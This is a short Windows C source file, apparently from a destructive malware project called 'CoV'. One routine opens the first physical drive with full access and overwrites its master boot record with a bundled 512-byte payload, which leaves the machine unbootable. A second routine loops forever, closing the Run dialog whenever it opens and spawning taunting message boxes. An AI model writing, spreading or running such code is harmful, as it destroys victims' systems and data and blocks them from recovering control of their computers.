#include "CoV.h"
#include "data.h"

int mbr() {
    DWORD dw;
    HANDLE mb = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    WriteFile(mb, mbrData, 512, &dw, 0);
    CloseHandle(mb);
}

DWORD WINAPI NoRun(LPVOID parameter) {
    while (1) {
        HWND hwnd = FindWindowA(NULL, "Run");
        HANDLE nb = NULL;
        if (!hwnd == NULL)
            SendMessage(hwnd, WM_CLOSE, 0, NULL);
        else
            continue;
        nb = CreateThread(0, 0, &CallBox, 0, 0, 0);
        Sleep(10);
    }
}

DWORD CALLBACK CallBox(LPVOID parameter) { return MessageBoxA(NULL, "There is no place you can run", "CoV", MB_ICONINFORMATION | MB_OK); }
